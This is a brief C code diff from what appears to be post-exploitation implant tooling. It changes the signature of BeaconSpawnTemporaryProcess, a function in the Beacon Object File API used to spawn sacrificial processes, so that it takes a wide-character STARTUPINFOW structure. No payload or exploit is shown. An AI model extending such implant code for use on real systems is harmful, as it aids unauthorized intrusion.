@@ -460,7 +460,7 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
     MemCopy( buffer, Path, Size );
 }
 
-BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo )
+BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFOW* sInfo, PROCESS_INFORMATION* pInfo )  // Wide version for CreateProcessW
 {
     BOOL    bSuccess    = FALSE;
     HANDLE  hToken      = INVALID_HANDLE_VALUE;
